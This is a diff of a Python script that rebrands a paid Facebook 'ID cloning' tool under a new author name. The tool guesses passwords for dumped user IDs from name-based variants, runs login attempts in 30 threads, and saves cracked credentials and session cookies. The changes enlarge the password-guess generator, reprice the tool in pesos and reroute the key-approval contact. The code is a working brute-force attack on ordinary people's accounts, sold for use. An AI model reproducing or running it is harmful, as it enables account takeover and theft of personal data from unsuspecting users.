@@ -1,4 +1,4 @@
-# -----------------[ MR-JUBAYER ]-------------------#
+# -----------------[ Axczel ]-------------------#
 
 import sys
 import time
@@ -1675,7 +1675,7 @@ P2 = "[#FFFFFF]"  # Putih
 J2 = "[#FF8F00]"  # Jingga
 A2 = "[#AAAAAA]"  # Abu-Abu
 
-# --------------------[ CONVERTER-BULAN ]--------------#
+# --------------------[ MONTH-CONVERTER ]--------------#
 
 dic = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June',
        '7': 'July', '8': 'August', '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
@@ -1685,7 +1685,7 @@ tgl = datetime.datetime.now().day
 bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 date = str(tgl)+'/'+str(bln)+'/'+str(thn)
 ltx = int(lt()[3])
 if ltx > 12:
@@ -1749,18 +1749,20 @@ def animation(u):
 
 os.system('https://www.facebook.com/groups/396745059590202/permalink/402797872318254/?mibextid=Nif5oz')
 logo = """
-\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-\033[0;91m┏┓┏┓┓┏┳┓┏┓┳┓  \033[0;94m┏┳┳┳┳┓┏┓┓┏┏┓┳┓┏┓ ┏┓
-\033[0;91m┃ ┣┫┗┫┣┫┣┫┣┫━━\033[0;94m┃┃┃┣┫┣┫┗┫┣ ┣┫┏┛ ┃┫
-\033[0;91m┗┛┛┗┗┛┻┛┛┗┛┗  \033[0;94m┗┛┗┛┻┛┛┗┗┛┗┛┛┗┗━•┗
-\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                       
+\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+\033[0;91m   _                    _ \033[0;94m __  ___                 
+\033[0;91m  /_\ __  _____ _______| |\033[0;94m\ \/ / |__   __ _ _ __  
+\033[0;91m //_\\\ \/ / __|_  / _ \ |\033[0;94m  \  /| '_ \ / _` | '_ \ 
+\033[0;91m/  _  \>  < (__ / /  __/ |\033[0;94m  /  \| | | | (_| | | | |
+\033[0;91m\_/ \_/_/\_\___/___\___|_|\033[0;94m /_/\_\_| |_|\__,_|_| |_|
+\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                       
 \033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-╠══[Author                   • \33[1;38mJUBAYER-BRO ]\33[1;38m    ║\033[1;31m 
-╠══[Facebook                 • JUBAYER360       ║  \033[1;97m  
-╠══[Github                   • \33[1;38mJUBAYERmoulik008 ║\33[1;34m   
-╠══[Whatsapp                 • 01*********    ║\33[1;35m 
-╠══[TOOLS                    • Paid]         ║ \33[1;32m   
-╠══[VERSION                  • 1.2]           ║\033[1;35m 
+╠══[Author                   • \33[1;38mAxczel Xhan ]\33[1;38m    ║\033[1;31m 
+╠══[Facebook                 • Axl Chan       ║  \033[1;97m  
+╠══[Github                   • \33[1;secret ║\33[1;34m   
+╠══[Whatsapp                 • 63*******35    ║\33[1;35m 
+╠══[TOOLS                    • Paid         ║ \33[1;32m   
+╠══[VERSION                  • 1.0.0]           ║\033[1;35m 
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
 balpakna = (
     """\x1b[38;5;50m══════════════════════════════════════════════════""")
@@ -1771,7 +1773,7 @@ alltimexudi = (
 xudartimenai = (""" \033[32;1m[+] CONTACT ADMIN PLEASE ENTER""")
 fuckyoursali = (""" \033[32;1m[𝟷] YOUR TOKEN IS SUCCESSFULLY APPROVED""")
 xudinaministar = (""" \033[38;1m[-] Important Note """)
-hedaborakarent = (""" \033[35;1m[𝟸] FUCK BYPASS YOUR DATA ABAL😎 """)
+hedaborakarent = (""" \033[35;1m[𝟸] Enjoy Cracking😎 """)
 
 # ____APPROVAL SYSTEM ADD_____#
 
@@ -1798,16 +1800,16 @@ def meyexudi():
             print(' \033[38;5;46m║══[𝟸]💥  ONLY ACTIVE ID CLONE 100%')
             print(' \033[38;5;46m║══[𝟸]💥  CP ID WILL BE LOGIN 80%')
             print(' \033[38;5;46m║══[𝟸]💥  WI-FI  AND DATA BOTH WORKING 100%')
-            print(' \033[38;5;46m║══[𝟸]💥  07 DAY 200 TAKA ')
-            print(' \033[38;5;46m║══[𝟸]💥  15 DAY 500 TAKA ')
+            print(' \033[38;5;46m║══[𝟸]💥  07 DAY 80 peso ')
+            print(' \033[38;5;46m║══[𝟸]💥  15 DAY 150 peso ')
 
             os.system(
-                'espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   MR,   JUBAYER,    Please,   Send,   Your,   Key,"')
+                'espeak -a 300 " Hello,   Sir,   I,   Am,    Robot,   of,   MR,   Axl,    Please,   Send,   Your,   Key,"')
             print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
             input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
-            tks = (
+            txt = (
                 'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id)
-            #os.system('am start https://wa.me/+639682468435?text=' + tks), approval()
+            os.system('am start https://m.me/axczel.xhan?text=' + txt), approval()
             time.sleep(1)
             meyexudi()
     except:
@@ -1815,7 +1817,7 @@ def meyexudi():
 
 
 meyexudi()
-#os.system("python axl.py")
+# os.system("python axl.py")
 
 
 def naima():
@@ -1823,10 +1825,10 @@ def naima():
 
 
 print(logo)
-os.system('espeak -a 300 " Please,   Text,   Your,   Real,   Name,   Sir,"')
+os.system('espeak -a 300 " Please,  Input,   Your,   Real,   Name,   Sir,"')
 uname = input(
-    '\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
-os.system('espeak -a 300 " Welcome,   to,  JUBAYER,BRO,  PAID,   Tools"')
+    '\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m Input Your Name \033[1;91m: \33[1;31m')
+os.system('espeak -a 300 " Welcome,   to,  Axzel, BRO,  PAID,   Tools"')
 
 
 def back():
@@ -1915,7 +1917,7 @@ def login_lagi334():
     except Exception as e:
         os.system("rm -f .token.txt")
         os.system("rm -f .cok.txt")
-        os.system("python nono.py")
+        os.system("python axl.py")
         exit()
 
 # ------------------[ MENU ]----------------#
@@ -1944,19 +1946,19 @@ def menu():
     print(f"""\033[38;5;46m[\033[93;1m3\033[93;1m] \033[93;1m𝗖𝗛𝗘𝗖𝗞 ϴᏦ 𝗜𝗗𝘇   """)
     print("""\033[38;5;46m[\033[98;1m0\033[98;1m] \033[0;98mᎬХᏆͲ""")
     print('\033[38;5;46m=================')
-    JUBAYER = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
-    if JUBAYER in ['111']:
+    UserInput = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
+    if UserInput in ['111']:
         login()
         dump_massal()
-    elif JUBAYER in ['1']:
+    elif UserInput in ['1']:
         crack_file()
-    elif JUBAYER in ['2', '02']:
+    elif UserInput in ['2', '02']:
         os.system(
             'xdg-open https://github.com/secre159/approval/blob/main/approved.txt')
-        os.system("python nono.py")
-    elif JUBAYER in ['3', '03']:
+        os.system("python axl.py")
+    elif UserInput in ['3', '03']:
         result()
-    elif JUBAYER in ['0']:
+    elif UserInput in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
         print('\033[0;97m=================')
@@ -1967,7 +1969,7 @@ def menu():
         animation(' [×] SELECT CORRECTLY ')
         back()
 
-        # -----------------[ HASIL-CRACK ]-----------------#
+        # -----------------[ CRACK-RESULT ]-----------------#
 
 
 def result():
@@ -1989,7 +1991,7 @@ def result():
         if len(vin) == 0:
             print('\033[0;91m==================')
             animation(
-                ' \033[95;1m[\033[95;1m•\033[95;1m] NO CP RESULTS FOUND ')
+                ' \033[95;1m[\033[95;1m•\033[95;1m] NO CHECKPOINT RESULTS FOUND ')
             time.sleep(2)
             back()
         else:
@@ -2173,7 +2175,7 @@ def dump_massal():
 def crack_file():
     print('\033[0;93m==================')
     os.system('espeak -a 300 " your file name"')
-    print('\033[1;36m[ Put File Example:  /sdcard/king.txt  Etc...]')
+    print('\033[1;36m[ Put File Example:  /sdcard/name.txt  Etc...]')
     o = input('\033[95;1m[\033[92;1m+\033[95;1m] INPut FILE NAME :\033[95;1m ')
     try:
         lin = open(o).read().splitlines()
@@ -2249,85 +2251,139 @@ def passwrd():
           time.strftime("%H:%M")+" " + tag)
     print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;91m𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 𝐒𝐔𝐏𝐄𝐑 𝐅𝐀𝐒𝐓 ⏩")
     print(
-        f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
+        f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 EVERY 3 MINS 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
     print('\x1b[38;5;50m===============================================')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
-            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
-            frs = nmf.split(' ')[0]
+            idf, full_name = yuzong.split('|')[0], yuzong.split('|')[1].lower()
+            names = full_name.split(' ')
+            first_name = names[0] if names else ''
+            middle_name = names[1] if len(names) > 1 else ''
+            last_name = ' '.join(names[2:]) if len(names) > 2 else ''
             pwv = []
-            if len(nmf) < 6:
-                if len(frs) < 3:
-                    pass
-                else:
-                    pwv.append(frs+'12')
-                    pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'123456')
-                    pwv.append(nmf)
+
+            if len(full_name) < 6:
+                if len(first_name) < 3 or len(middle_name) < 3 or len(last_name) < 3:
+                    # Append variations to pwv for each name component
+                    for i in range(1, 21):
+                        pwv.append(first_name + str(i))
+                        pwv.append(middle_name + str(i))
+                        pwv.append(last_name + str(i))
+
+                # Combine first, middle, and last name
+                        pwv.append(first_name + middle_name + last_name)
+                        pwv.append(first_name + last_name + middle_name)
+                        pwv.append(middle_name + first_name + last_name)
+                        pwv.append(middle_name + last_name + first_name)
+                        pwv.append(last_name + first_name + middle_name)
+                        pwv.append(last_name + middle_name + first_name)
+
+                # Add variations with special characters and common patterns
+                        pwv.append(first_name + str(i) + '!')
+                        pwv.append(middle_name + str(i) + '@')
+                        pwv.append(last_name + str(i) + '#')
+                        pwv.append(first_name + middle_name + str(i) + '$')
+                        pwv.append(first_name + last_name + str(i) + '%')
+                        pwv.append(first_name + middle_name + last_name + str(i) + '&')
+                        pwv.append(first_name + str(i) + str(i + 1))
+                        pwv.append(last_name + str(i) + str(i + 1))
+
+                # Common patterns and variations
+                        pwv.append(first_name.lower())
+                        pwv.append(middle_name.lower())
+                        pwv.append(last_name.lower())
+                        pwv.append(first_name.upper())
+                        pwv.append(middle_name.upper())
+                        pwv.append(last_name.upper())
+                        pwv.append(first_name.capitalize())
+                        pwv.append(middle_name.capitalize())
+                        pwv.append(last_name.capitalize())
+                        pwv.append(first_name + middle_name)
+                        pwv.append(first_name + last_name)
+                        pwv.append(middle_name + first_name)
+                        pwv.append(middle_name + last_name)
+                        pwv.append(last_name + first_name)
+                        pwv.append(last_name + middle_name)
+
+                # Additional patterns and variations
+                        pwv.append(first_name + last_name[:2])
+                        pwv.append(first_name[:2] + last_name)
+                        pwv.append(first_name[:2] + middle_name[:2] + last_name[:2])
+                        pwv.append(first_name[::-1])
+                        pwv.append(last_name[::-1])
+                        pwv.append(first_name + middle_name + last_name[::-1])
+                        pwv.append(first_name + middle_name[::-1] + last_name)
+                        pwv.append(last_name + middle_name + first_name[::-1])
+                        pwv.append(last_name + middle_name[::-1] + first_name)
+
+                    pwv.append(first_name+'12')
+                    pwv.append(first_name+'123')
+                    pwv.append(first_name+'1234')
+                    pwv.append(first_name+'12345')
+                    pwv.append(first_name+'123456')
+                    pwv.append(middle_name)
                     pwv.append('57273200')
-                    pwv.append(frs+'@123')
-                    pwv.append(frs+'@')
-                    pwv.append(frs+'@@')
-                    pwv.append(frs+'@@@')
-                    pwv.append(frs+'@@@@')
-                    pwv.append(frs+'@#')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'11')
-                    pwv.append(frs+'111')
-                    pwv.append(frs+'33')
-                    pwv.append(frs+'333')
-                    pwv.append(frs+'22')
-                    pwv.append(frs+'222')
-                    pwv.append(frs+'gaming')
-                    pwv.append(frs+'khan')
-                    pwv.append(frs+'hosen')
-                    pwv.append(frs+'Gaming')
-                    pwv.append(frs+'khan')
-                    pwv.append(frs+'019')
-                    pwv.append(frs+'017')
-                    pwv.append(frs+'016')
-                    pwv.append(frs+'018')
-                    pwv.append(frs+'khan')
-                    pwv.append(frs+'hosen')
+                    pwv.append(first_name+'@123')
+                    pwv.append(first_name+'@')
+                    pwv.append(first_name+'@@')
+                    pwv.append(first_name+'@@@')
+                    pwv.append(first_name+'@@@@')
+                    pwv.append(first_name+'@#')
+                    pwv.append(first_name+'1122')
+                    pwv.append(first_name+'11')
+                    pwv.append(first_name+'111')
+                    pwv.append(first_name+'33')
+                    pwv.append(first_name+'333')
+                    pwv.append(first_name+'22')
+                    pwv.append(first_name+'222')
+                    pwv.append(first_name+'gandako')
+                    pwv.append(first_name+'maganda')
+                    pwv.append(first_name+'ganda')
+                    pwv.append(first_name+'pogi')
+                    pwv.append(first_name+'khan')
+                    pwv.append(first_name+'19')
+                    pwv.append(first_name+'17')
+                    pwv.append(first_name+'16')
+                    pwv.append(first_name+'18')
+                    pwv.append(first_name+'143')
+                    pwv.append(first_name+'hosen')
 
             else:
-                if len(frs) < 3:
-                    pwv.append(nmf)
+                if len(first_name) < 3:
+                    pwv.append(middle_name)
                 else:
-                    pwv.append(frs+'12')
-                    pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'123456')
-                    pwv.append(nmf)
+                    pwv.append(first_name+'12')
+                    pwv.append(first_name+'123')
+                    pwv.append(first_name+'1234')
+                    pwv.append(first_name+'12345')
+                    pwv.append(first_name+'123456')
+                    pwv.append(middle_name)
                     pwv.append('57273200')
-                    pwv.append(frs+'@123')
-                    pwv.append(frs+'@')
-                    pwv.append(frs+'@@')
-                    pwv.append(frs+'@@@')
-                    pwv.append(frs+'@@@@')
-                    pwv.append(frs+'@#')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'11')
-                    pwv.append(frs+'111')
-                    pwv.append(frs+'33')
-                    pwv.append(frs+'333')
-                    pwv.append(frs+'22')
-                    pwv.append(frs+'222')
-                    pwv.append(frs+'gaming')
-                    pwv.append(frs+'khan')
-                    pwv.append(frs+'hosen')
-                    pwv.append(frs+'hossain')
-                    pwv.append(frs+'Gaming')
-                    pwv.append(frs+'khan')
-                    pwv.append(frs+'019')
-                    pwv.append(frs+'017')
-                    pwv.append(frs+'016')
-                    pwv.append(frs+'018')
-                    pwv.append(frs+'khan')
-                    pwv.append(frs+'hosen')
+                    pwv.append(first_name+'@123')
+                    pwv.append(first_name+'@')
+                    pwv.append(first_name+'@@')
+                    pwv.append(first_name+'@@@')
+                    pwv.append(first_name+'@@@@')
+                    pwv.append(first_name+'@#')
+                    pwv.append(first_name+'1122')
+                    pwv.append(first_name+'11')
+                    pwv.append(first_name+'111')
+                    pwv.append(first_name+'33')
+                    pwv.append(first_name+'333')
+                    pwv.append(first_name+'22')
+                    pwv.append(first_name+'222')
+                    pwv.append(first_name+'gaming')
+                    pwv.append(first_name+'khan')
+                    pwv.append(first_name+'hosen')
+                    pwv.append(first_name+'hossain')
+                    pwv.append(first_name+'Gaming')
+                    pwv.append(first_name+'khan')
+                    pwv.append(first_name+'019')
+                    pwv.append(first_name+'017')
+                    pwv.append(first_name+'016')
+                    pwv.append(first_name+'018')
+                    pwv.append(first_name+'khan')
+                    pwv.append(first_name+'hosen')
 
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
@@ -2351,7 +2407,7 @@ def passwrd():
     print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s ' % (cp))
     print('\n\033[1;37m===================================')
     woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
-    os.system("python nono.py")
+    os.system("python axl.py")
     exit()
 # --------------------[ METODE-B-API ]-----------------#
 
@@ -2360,7 +2416,7 @@ def crack(idf, pwv):
     global loop, ok, cp
     bo = random.choice([m, k, h, b, u, x])
     sys.stdout.write(
-        f"\r\033[100;95m{bo}[Axl 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+        f"\r\033[100;95m{bo}[AXCZEL 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2384,7 +2440,7 @@ def crack(idf, pwv):
                           data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(
-                    f'\r\033[38;5;46m[JUBAYER-Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
+                    f'\r\033[38;5;46m[AXCZEL- DEAD 🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
                 os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                 open('CP/'+cpc, 'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -2396,7 +2452,7 @@ def crack(idf, pwv):
                 kuki = (";").join(["%s=%s" % (key, value)
                                    for key, value in ses.cookies.get_dict().items()])
                 print(
-                    f'\r\033[38;5;46m[Axl-Ok🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
+                    f'\r\033[38;5;46m[AXCZEL - ALIVE🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
                 os.system(
                     'espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                 open('OK/'+okc, 'a').write(idf+' • '+pw+'\n')
@@ -2414,7 +2470,7 @@ def crack(idf, pwv):
 def crackfree(idf, pwv):
     global loop, ok, cp
     sys.stdout.write(
-        f"\r{H}[JUBAYER 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+        f"\r{H}[AXCZEL 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2438,9 +2494,9 @@ def crackfree(idf, pwv):
                           data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(
-                    f'\r\033[38;5;46m[{time.strftime("%H:%M")}•JUBAYER-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
+                    f'\r\033[38;5;46m[{time.strftime("%H:%M")}Axczel - DEAD] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                 os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
-                open('CP/'+cpc, 'a').write(idf+' • '+pw+'\n')
+                open('CP/'+cp, 'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp += 1
                 break
@@ -2450,7 +2506,7 @@ def crackfree(idf, pwv):
                 kuki = (";").join(["%s=%s" % (key, value)
                                    for key, value in ses.cookies.get_dict().items()])
                 print(
-                    f'\r\033[38;5;46m[{time.strftime("%H:%M")}•JUBAYER-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
+                    f'\r\033[38;5;46m[{time.strftime("%H:%M")}Axczel - ALIVE] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                 os.system(
                     'espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                 open('OK/'+okc, 'a').write(idf+' • '+pw+'\n')
